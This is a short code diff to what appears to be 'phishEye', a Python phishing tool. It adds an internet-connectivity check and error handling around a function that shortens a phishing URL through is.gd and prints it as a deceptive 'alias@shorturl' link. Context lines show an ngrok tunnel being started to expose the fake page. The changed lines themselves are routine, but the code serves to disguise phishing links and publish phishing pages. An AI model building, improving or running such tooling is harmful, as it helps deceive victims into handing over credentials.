@@ -51,11 +51,28 @@ try:
 
       return render_template("index.html")
 
+   
+   def is_connected():
+      try:
+         host = socket.gethostbyname("1.1.1.1")
+         s = socket.create_connection((host, 80), 2)
+         s.close()
+         return True
+      except:
+         pass
+      return False
+
    def short(url,alias):
-      import requests
-      x = requests.get(f'https://is.gd/create.php?format=json&url={url}')
-      r = x.json()
-      print(" [ * ] Phishing short link: "+alias+"@"+r["shorturl"].replace("https://",""))
+      try:
+         import requests
+         x = requests.get(f'https://is.gd/create.php?format=json&url={url}')
+         r = x.json()
+         print(" [ * ] Phishing short link: "+alias+"@"+r["shorturl"].replace("https://",""))
+      except:
+         if(is_connected()):
+            print("Short url error!!!\nPlease make an issue on github (https://github.com/sky9262/phishEye)")  
+         else:
+            print("You don't have internet connection for short url!!!")   
 
    def start_ngrok(port):
     from pyngrok import ngrok
